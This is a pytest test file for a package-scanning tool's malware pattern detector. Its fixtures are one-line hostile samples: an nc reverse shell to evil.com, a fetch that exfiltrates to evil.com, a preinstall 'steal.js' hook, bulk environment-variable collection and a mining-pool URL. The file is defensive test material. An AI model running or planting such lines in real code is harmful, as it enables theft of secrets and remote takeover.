"""Tests for pattern detection engine."""

import pytest

from git_guardian.models.package import RiskLevel
from git_guardian.scanner.patterns import PatternDetector


@pytest.fixture
def detector() -> PatternDetector:
    """Create a PatternDetector instance."""
    return PatternDetector()


class TestObfuscationPatterns:
    """Test obfuscation detection patterns."""

    def test_detects_base64_decode(self, detector: PatternDetector) -> None:
        code = 'const decoded = atob("bWFsaWNpb3Vz");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "OBFUSC-001" for f in findings)

    def test_detects_dynamic_code_exec(self, detector: PatternDetector) -> None:
        code = 'const fn = new' + ' Function("return process.env");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "OBFUSC-002" for f in findings)

    def test_detects_hex_strings(self, detector: PatternDetector) -> None:
        code = 'const s = "\\x68\\x65\\x6c\\x6c\\x6f\\x77\\x6f\\x72\\x6c\\x64";'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "OBFUSC-003" for f in findings)

    def test_no_false_positive_on_normal_code(self, detector: PatternDetector) -> None:
        code = 'const x = 42;\nconsole.log("hello");'
        findings = detector.scan_file("test.js", code)
        assert len(findings) == 0


class TestEnvironmentPatterns:
    """Test environment variable detection."""

    def test_detects_env_access(self, detector: PatternDetector) -> None:
        code = "const key = process.env.API_KEY;"
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "ENV-001" for f in findings)

    def test_detects_bulk_env_collection(self, detector: PatternDetector) -> None:
        code = "const all = { ...process.env };"
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "ENV-002" for f in findings)


class TestNetworkPatterns:
    """Test network detection patterns."""

    def test_detects_http_request(self, detector: PatternDetector) -> None:
        code = 'fetch("https://evil.com/steal");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "NET-001" for f in findings)

    def test_detects_websocket(self, detector: PatternDetector) -> None:
        code = 'const ws = new WebSocket("wss://evil.com");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "NET-002" for f in findings)


class TestFileSystemPatterns:
    """Test file system detection patterns."""

    def test_detects_file_write(self, detector: PatternDetector) -> None:
        code = 'fs.writeFile("/tmp/malware", payload);'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "FS-001" for f in findings)


class TestCryptoPatterns:
    """Test cryptocurrency detection patterns."""

    def test_detects_eth_address(self, detector: PatternDetector) -> None:
        code = 'const wallet = "0x742d35Cc6634C0532925a3b844Bc9e7595f2bD18";'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "CRYPTO-001" for f in findings)

    def test_detects_clipboard_access(self, detector: PatternDetector) -> None:
        code = "navigator.clipboard.writeText(walletAddress);"
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "CRYPTO-002" for f in findings)


class TestScriptPatterns:
    """Test install script detection."""

    def test_detects_preinstall(self, detector: PatternDetector) -> None:
        code = '{ "scripts": { "preinstall": "node steal.js" } }'
        findings = detector.scan_file("package.json", code)
        assert any(f.rule_id == "SCRIPT-001" for f in findings)

    def test_detects_postinstall(self, detector: PatternDetector) -> None:
        code = '{ "scripts": { "postinstall": "node setup.js" } }'
        findings = detector.scan_file("package.json", code)
        assert any(f.rule_id == "SCRIPT-002" for f in findings)


class TestExecPatterns:
    """Test execution detection patterns."""

    def test_detects_spawn(self, detector: PatternDetector) -> None:
        code = 'const { spawn } = require("child_process");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "EXEC-001" for f in findings)


class TestMalwarePatterns:
    """Test known malware patterns."""

    def test_detects_reverse_shell(self, detector: PatternDetector) -> None:
        code = 'connect("nc -e /bin/sh evil.com 4444");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "MALWARE-001" for f in findings)

    def test_detects_crypto_miner(self, detector: PatternDetector) -> None:
        code = 'connect("stratum+tcp://pool.mining.com:3333");'
        findings = detector.scan_file("test.js", code)
        assert any(f.rule_id == "MALWARE-002" for f in findings)


class TestPackageScanning:
    """Test scanning entire packages."""

    def test_scan_package_deduplicates(self, detector: PatternDetector) -> None:
        files = {
            "index.js": "process.env.KEY;",
            "lib/util.js": "process.env.KEY;",
        }
        findings = detector.scan_package(files)
        env_findings = [f for f in findings if f.rule_id == "ENV-001"]
        assert len(env_findings) == 2

    def test_scan_package_empty(self, detector: PatternDetector) -> None:
        findings = detector.scan_package({})
        assert len(findings) == 0


class TestRiskLevels:
    """Test risk level assignments."""

    def test_critical_risk_for_malware(self, detector: PatternDetector) -> None:
        code = 'connect("nc -e /bin/sh evil.com 4444");'
        findings = detector.scan_file("test.js", code)
        malware_findings = [f for f in findings if f.risk_level == RiskLevel.CRITICAL]
        assert len(malware_findings) > 0

    def test_high_risk_for_obfuscation(self, detector: PatternDetector) -> None:
        code = 'const decoded = atob("bWFsaWNpb3Vz");'
        findings = detector.scan_file("test.js", code)
        high_findings = [f for f in findings if f.risk_level == RiskLevel.HIGH]
        assert len(high_findings) > 0
